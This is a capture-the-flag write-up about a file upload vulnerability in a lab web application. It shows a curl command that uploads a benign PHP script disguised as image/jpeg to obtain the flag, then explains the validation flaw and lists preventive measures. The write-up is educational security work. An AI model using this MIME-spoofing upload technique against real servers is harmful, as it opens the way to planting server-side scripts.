# Upload Image Vulnerability

## Discovery Process

1. Click on **Add image** button
2. Inspect the upload button and find:
```html
<input type="submit" name="Upload" value="Upload">
```
3. Identified that the upload functionality might not properly validate file types

## Vulnerability Details

- **Issue**: File upload validation relies on Content-Type header instead of actual file content
- **Attack vector**: Upload malicious script by spoofing MIME type to `image/jpeg`

## Exploitation

1. Create a PHP script file (`script.php`)
2. Upload the script using cURL while spoofing the Content-Type:

```bash
echo '<?php echo "Darkly" ?>' > 05_upload_image/script.php && curl -X POST \
-F "uploaded=@05_upload_image/script.php;type=image/jpeg" \
-F "Upload=Upload" \
"http://10.11.200.35/index.php?page=upload" | grep flag
```

3. The server accepts the upload because we specified `type=image/jpeg`, even though it's a PHP script
4. Successfully obtained the flag

## Why Does This Happen?

1. **Insufficient file validation**: Server only checks the Content-Type header, not actual file content
2. **Trust in client data**: The application trusts the MIME type provided by the client
3. **No file extension verification**: Server doesn't validate that the file extension matches content
4. **Missing magic byte checking**: No verification of file signatures (magic bytes) to confirm file type

## How to Prevent It

1. **Validate file content**: Check magic bytes/file signatures, not just headers or extensions
2. **Use a whitelist**: Only allow specific, safe file types (jpg, png, gif)
3. **Rename uploaded files**: Store files with random names and safe extensions
4. **Store outside web root**: Keep uploaded files in a non-executable directory
5. **Disable script execution**: Configure server to prevent execution of scripts in upload directories
